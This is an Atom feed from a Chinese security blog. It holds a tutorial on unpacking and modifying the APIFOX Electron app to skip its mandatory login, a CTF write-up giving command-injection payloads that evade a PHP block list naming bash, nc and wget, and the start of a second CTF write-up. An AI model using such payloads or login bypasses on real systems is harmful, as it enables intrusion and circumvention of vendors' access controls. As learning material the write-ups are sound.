<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://example.com</id>
    <title>Hexo</title>
    <subtitle></subtitle>
    <icon>http://example.com/images/favicon.ico</icon>
    <link href="http://example.com" />
    <author>
      <name>moicena</name>
    </author>
    <updated>2024-07-24T15:19:44.000Z</updated>
    <category term="数据库" />
    <entry>
        <id>http://example.com/2024/07/24/%E6%9F%90API%E5%B7%A5%E5%85%B7%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/</id>
        <title>某API工具的逆向分析学习</title>
        <link rel="alternate" href="http://example.com/2024/07/24/%E6%9F%90API%E5%B7%A5%E5%85%B7%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/"/>
        <content type="html">&lt;h1 id=&#34;起因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#起因&#34;&gt;#&lt;/a&gt; 起因&lt;/h1&gt;
&lt;p&gt;开发后端时需要一个 API 工具对完成的 API 进行测试，手中有 POSTMAN 但此工具用起来不太友好，因此第一时间想到了 APIFOX。由于某些原因，需要在离线的情况下使用，而经过测试 APIFOX 必须登录后才能进入界面使用，显然这是一个不得不解决的问题。&lt;/p&gt;
&lt;h1 id=&#34;观察应用的特点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#观察应用的特点&#34;&gt;#&lt;/a&gt; 观察应用的特点&lt;/h1&gt;
&lt;p&gt;以前的桌面应用基本上都是二进制程序，可以通过如 Ollydbg 或者 IDA 等专门的工具进行逆向分析。经过初步的尝试，Ollydbg 提示这不是一个标准的二进制程序，因此暂时碰到了分析过程中的第一个问题。但根据界面的特点以及以往的经验可以判断出这大概是一个打包成桌面应用的前端程序，而且有可能前端框架还是 electron。于是根据这个线索在网上搜索对应的逆向分析方法，诶嘿还真找到了一个非常相似的教程&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuNTJwb2ppZS5jbi90aHJlYWQtMTc4NjgxMS0xLTEuaHRtbA==&#34;&gt; Xmind macOS &amp;amp; Windows (23.09.xxxxx) 通杀方案&lt;/span&gt; &lt;sup class=&#34;footnote-ref&#34;&gt;&lt;a href=&#34;#fn1&#34; id=&#34;fnref1&#34;&gt;[1]&lt;/a&gt;&lt;/sup&gt;。&lt;/p&gt;
&lt;h1 id=&#34;解包&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#解包&#34;&gt;#&lt;/a&gt; 解包&lt;/h1&gt;
&lt;p&gt;前端的打包后的程序经过安装后其核心实现部分位于安装目录下 resources 文件夹的 app.asar 文件中，对于 app.asar 的分析需要在 node 中安装 asar 工具。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;步骤&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;全局安装 npm：npm 是随着 node 一同安装的，可以自行搜索 node 的安装教程；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;全局安装 asar：与 npm 安装其他依赖方法一致&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;npm install -g asar&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看 asar 是否安装成功：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;asar -V #如果出现版本号则说明安装成功；&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;解压 asar：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;asar extract app.asar ./app #解压文件到 app 目录中，解压成功后可以看到其中有 dist/node_modules/package.json 三个文件或文件夹&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/jylc/BlogImage/main/images/20240725000838.png&#34; alt=&#34;目录&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;分析解压出的文件：使用熟悉的工具打开 app 目录进行分析。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#分析&#34;&gt;#&lt;/a&gt; 分析&lt;/h1&gt;
&lt;p&gt;分析的重点主要还是解压出的 dist 文件夹，其他两个只是依赖库目录与依赖库的版本信息文件。main 目录下的代码被 bytenode 加密过无法分析，因此选择从 renderer 入手。&lt;/p&gt;
&lt;h2 id=&#34;字段特征起手&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#字段特征起手&#34;&gt;#&lt;/a&gt; 字段特征起手&lt;/h2&gt;
&lt;p&gt;为方便搜索语言选为英文（界面的中文与日文在程序中被编码为了 unicode，搜索多了一步编码转换的过程），随意输入账号出现报错提示，根据该提示在代码中全局搜索，&lt;br /&gt;
&lt;img data-src=&#34;https://raw.githubusercontent.com/jylc/BlogImage/main/images/20240725001557.png&#34; alt=&#34;登录报错&#34; /&gt;&lt;br /&gt;
定位到提示出现的地方，目测，前面的字段是前端应用的组件属值，据此向下继续搜索，&lt;br /&gt;
&lt;img data-src=&#34;https://raw.githubusercontent.com/jylc/BlogImage/main/images/20240725002805.png&#34; alt=&#34;报错提示定位&#34; /&gt;&lt;br /&gt;
观察到，第一个出现的地方与其他地方有关明显的不同，位于运行代码之中。&lt;br /&gt;
&lt;img data-src=&#34;https://raw.githubusercontent.com/jylc/BlogImage/main/images/20240725003043.png&#34; alt=&#34;组件属性定位&#34; /&gt;&lt;br /&gt;
编译过后的 js 代码阅读起来是很困难的，毕竟没有可辨析的名称。。。&lt;br /&gt;
&lt;img data-src=&#34;https://raw.githubusercontent.com/jylc/BlogImage/main/images/20240725003808.png&#34; alt=&#34;定位处代码&#34; /&gt;&lt;br /&gt;
往前看看代码，可以发现有 onSuccess 和 onError 的字样，猜测与网络请求有关，于是可以进一步进行溯源。其实对编译后的 js 代码并不怎么了解，但看到框出来的部分联想到其可能是调用的方法，因此继续追踪，&lt;br /&gt;
&lt;img data-src=&#34;https://raw.githubusercontent.com/jylc/BlogImage/main/images/20240725212623.png&#34; alt=&#34;出现的字段&#34; /&gt;&lt;br /&gt;
&lt;img data-src=&#34;https://raw.githubusercontent.com/jylc/BlogImage/main/images/20240725213157.png&#34; alt=&#34;BqDR&#34; /&gt;&lt;br /&gt;
 再次定位，出现了 api 形式的部分，但 captchas 应该是与验证码相关，&lt;br /&gt;
&lt;img data-src=&#34;https://raw.githubusercontent.com/jylc/BlogImage/main/images/20240725213257.png&#34; alt=&#34;S&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;动态调试&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#动态调试&#34;&gt;#&lt;/a&gt; 动态调试&lt;/h2&gt;
&lt;p&gt;再追踪 t.a 线索就断了，因为在 t 对应的方法中找不到有 a 方法出现地方。这里简要说明下 e.d (a,b,function {})，该形式的方法初步猜测是 Object.defineProperty (obj, prop, descriptor)，该方法是 es5 的方法，作用是直接在一个对象上定义一个新属性或者修改一个对象的现有属性，并返回这个对象 &lt;sup class=&#34;footnote-ref&#34;&gt;&lt;a href=&#34;#fn2&#34; id=&#34;fnref2&#34;&gt;[2]&lt;/a&gt;&lt;/sup&gt;，所以 e.d 的第二个参数 b 是被外部调用的属性的名称，而 a 是目标对象，&lt;br /&gt;
&lt;img data-src=&#34;https://raw.githubusercontent.com/jylc/BlogImage/main/images/20240725213938.png&#34; alt=&#34;t&#34; /&gt;&lt;br /&gt;
&lt;img data-src=&#34;https://raw.githubusercontent.com/jylc/BlogImage/main/images/20240725214005.png&#34; alt=&#34;+Xce&#34; /&gt;&lt;br /&gt;
 在该方法中翻了翻找到了 login 的字眼，也许就是登录的 api，有点奇怪的是找不到前面 l.Zh.location.pathname 中 l 对应的方法定义位置。&lt;br /&gt;
&lt;img data-src=&#34;https://raw.githubusercontent.com/jylc/BlogImage/main/images/20240725214726.png&#34; alt=&#34;login字段&#34; /&gt;&lt;br /&gt;
调用 login 这个 api 的方法上下都看了看发现并不是网络上的请求，得在别处看看。login 所在的 ae 方法或许可以看一下其调用，因为明显地 z 是返回的响应，而它又是从 de.response 处获得的值，&lt;br /&gt;
&lt;img data-src=&#34;https://raw.githubusercontent.com/jylc/BlogImage/main/images/20240725220410.png&#34; alt=&#34;ae&#34; /&gt;&lt;br /&gt;
 但 ae 的调用并不是那么好找，因此转换一下思路，尝试调试一下应用找到调用的堆栈&lt;sup class=&#34;footnote-ref&#34;&gt;&lt;a href=&#34;#fn3&#34; id=&#34;fnref3&#34;&gt;[3]&lt;/a&gt;&lt;/sup&gt;&lt;sup class=&#34;footnote-ref&#34;&gt;&lt;a href=&#34;#fn4&#34; id=&#34;fnref4&#34;&gt;[4]&lt;/a&gt;&lt;/sup&gt;&lt;br /&gt;
。再如图中所示的位置打个断点并运行应用，可以看到应用运行的一些信息了，确实没猜错 z 是返回的响应内容&lt;br /&gt;
&lt;img data-src=&#34;https://raw.githubusercontent.com/jylc/BlogImage/main/images/20240725222032.png&#34; alt=&#34;断点&#34; /&gt;&lt;br /&gt;
通过调用堆栈信息，能够容易地找到请求入口，&lt;br /&gt;
&lt;img data-src=&#34;https://raw.githubusercontent.com/jylc/BlogImage/main/images/20240725222318.png&#34; alt=&#34;请求入口1&#34; /&gt;&lt;br /&gt;
&lt;img data-src=&#34;https://raw.githubusercontent.com/jylc/BlogImage/main/images/20240725222542.png&#34; alt=&#34;请求入口2&#34; /&gt;&lt;/p&gt;
&lt;p&gt;既然看到是有 request 方法进行的请求，很合理地认为该 request 就是引用 1 中的 electron 中 net 模块的 request，也自然按照文章中方法对 request 进行了 hook 操作，但经过操作后发现并不能拦截到网络请求，想了想觉得可能哪里有不对的地方，于是进入 request 方法看看它到底经过了哪些代码，步入后发现了图中的部分代码，打个断点看看，果然会在这边停住，&lt;br /&gt;
&lt;img data-src=&#34;https://raw.githubusercontent.com/jylc/BlogImage/main/images/20240725225941.png&#34; alt=&#34;发现&#34; /&gt;&lt;br /&gt;
后面又继续跟进代码，但总会出现一个问题：跟进到某个地方后，突然就会跳到其它地方并且返回了请求的响应内容，百思不得其解。后来搜了下 dealRequestInterceptors 发现它是 umi-request 库中的&lt;sup class=&#34;footnote-ref&#34;&gt;&lt;a href=&#34;#fn5&#34; id=&#34;fnref5&#34;&gt;[5]&lt;/a&gt;&lt;/sup&gt;，这下麻了，谁会想到是用的其他库中的网络请求。依葫芦画瓢，将原来的 hook 代码中 electron 的 request 换成 umi-request 库中的内容，但还是无法拦截，仔细看到了下官方的使用方式，与代码中的比较了一下可以确认是通过 import 方式进行的导入调用&lt;sup class=&#34;footnote-ref&#34;&gt;&lt;a href=&#34;#fn6&#34; id=&#34;fnref6&#34;&gt;[6]&lt;/a&gt;&lt;/sup&gt;&lt;br /&gt;
。在 js 中有两种引入模块的方法，import 和 request，import 是静态的，必须在编译时就确定要加载哪些模块，request 是动态的，可以运行时根据需要加载模块，根据我的理解 import 相当于 C 程序中的 #include 起到导入头文件的作用，request 相当于加载 DLL 动态链接库文件，因此 request 形式的导入是可以通过 hook 修改原方法的属性值，而 import 不行。既然不能通过 hook 的方式修改，那没办法只能在解包后的文件中修改了，试了一下还真可以，这样后续的修改就没什么问题了～&lt;/p&gt;
&lt;h1 id=&#34;打包&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#打包&#34;&gt;#&lt;/a&gt; 打包&lt;/h1&gt;
&lt;p&gt;运行以下代码&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;asar pack ./app app.asar&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr class=&#34;footnotes-sep&#34; /&gt;
&lt;section class=&#34;footnotes&#34;&gt;
&lt;ol class=&#34;footnotes-list&#34;&gt;
&lt;li id=&#34;fn1&#34; class=&#34;footnote-item&#34;&gt;&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuNTJwb2ppZS5jbi90aHJlYWQtMTc4NjgxMS0xLTEuaHRtbA==&#34;&gt;Xmind macOS &amp;amp; Windows (23.09.xxxxx) 通杀方案&lt;/span&gt; &lt;a href=&#34;#fnref1&#34; class=&#34;footnote-backref&#34;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&#34;fn2&#34; class=&#34;footnote-item&#34;&gt;&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9qdWVqaW4uY24vcG9zdC82ODQ0OTAzNzU5ODAyMjg2MDg4&#34;&gt;Object.defineProperty 的用法详解&lt;/span&gt; &lt;a href=&#34;#fnref2&#34; class=&#34;footnote-backref&#34;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&#34;fn3&#34; class=&#34;footnote-item&#34;&gt;&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0hvWWFfMS9hcnRpY2xlL2RldGFpbHMvMTMxNTMzNzQ5&#34;&gt;Electron 应用调试&lt;/span&gt; &lt;a href=&#34;#fnref3&#34; class=&#34;footnote-backref&#34;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&#34;fn4&#34; class=&#34;footnote-item&#34;&gt;&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvWE5jVVh6NjQwd0tKcTBwSElHc2hnUQ==&#34;&gt;Electron 的一些调试技巧&lt;/span&gt; &lt;a href=&#34;#fnref4&#34; class=&#34;footnote-backref&#34;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&#34;fn5&#34; class=&#34;footnote-item&#34;&gt;&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd3VoYW96aG91L3AvMTQwMzA1NDAuaHRtbA==&#34;&gt;umi-request 中间件和拦截器解析&lt;/span&gt; &lt;a href=&#34;#fnref5&#34; class=&#34;footnote-backref&#34;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&#34;fn6&#34; class=&#34;footnote-item&#34;&gt;&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3VtaWpzL3VtaS1yZXF1ZXN0&#34;&gt;umi-request&lt;/span&gt; &lt;a href=&#34;#fnref6&#34; class=&#34;footnote-backref&#34;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</content>
        <category term="逆向分析" scheme="http://example.com/tags/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/" />
        <updated>2024-07-24T15:19:44.000Z</updated>
    </entry>
    <entry>
        <id>http://example.com/2024/07/17/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-finalrce/</id>
        <title>[SWPUCTF 2021 新生赛]finalrce</title>
        <link rel="alternate" href="http://example.com/2024/07/17/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-finalrce/"/>
        <content type="html">&lt;p&gt;进入网站页面后显示 php 代码:&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;highlight_file&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;url&amp;#x27;&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$url&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;url&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&amp;quot;|\&amp;gt;|\&amp;lt;|\%|\$/i&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$url&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Sorry,you can&amp;#x27;t use this.&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Can you see anything?&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;exec&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$url&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可以看到其中 preg_match 过滤了基本的一些命令，想要通过 exec 执行需要绕过去。&lt;br /&gt;
测试以下命令，发现不能执行：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?url=ls;sleep 5&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;对 ls 取反，继续执行：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?url=%93%8C;sleep 5&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;发现可以执行。其中英文字母的 url 编码为 16 进制前添加 %。&lt;br /&gt;
接下来使用 tee 命令将标准输入中的数据写入输出文件中:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?url=l&#39;&#39;s /|tee 1.txt&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;访问 http://ip:port/?1.txt 可以看到根目录下的所有文件夹。&lt;br /&gt;
由于 cat 被过滤了，使用 tac 反向显示文件内容：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?url=tac /file|tee 2.txt&lt;/p&gt;
&lt;/blockquote&gt;
</content>
        <category term="网络安全" scheme="http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" />
        <category term="SWPUCTF 2021" scheme="http://example.com/tags/SWPUCTF-2021/" />
        <updated>2024-07-17T15:12:12.000Z</updated>
    </entry>
    <entry>
        <id>http://example.com/2024/07/03/ZJCTF-2019-NiZhuanSiWei-KiHanahare%E7%9A%84WriteUp/</id>
        <title>[ZJCTF 2019]NiZhuanSiWei KiHanahare的WriteUp</title>
        <link rel="alternate" href="http://example.com/2024/07/03/ZJCTF-2019-NiZhuanSiWei-KiHanahare%E7%9A%84WriteUp/"/>
        <content type="html">&lt;p&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$text&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;text&amp;quot;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;file&amp;quot;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;password&amp;quot;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$text&lt;/span&gt;)&amp;amp;&amp;amp;(&lt;span class=&#34;title function_ invoke__&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$text&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;)===&lt;span class=&#34;string&#34;&gt;&amp;quot;welcome to the zjctf&amp;quot;&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;&amp;quot;&lt;/span&gt;.&lt;span class=&#34;title function_ invoke__&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$text&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;).&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/h1&amp;gt;&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;/flag/&amp;quot;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Not now!&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;(); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;);  &lt;span class=&#34;comment&#34;&gt;//useless.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;highlight_file&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;通过代码可以知道首要的目标是进入第一个 if 中，进入的条件是满足 text 是被设置了值的且该值为 &amp;quot;welcome to the zjctf&amp;quot;。&lt;br /&gt;
进入该条件中需要用到 data:// 协议&lt;/p&gt;
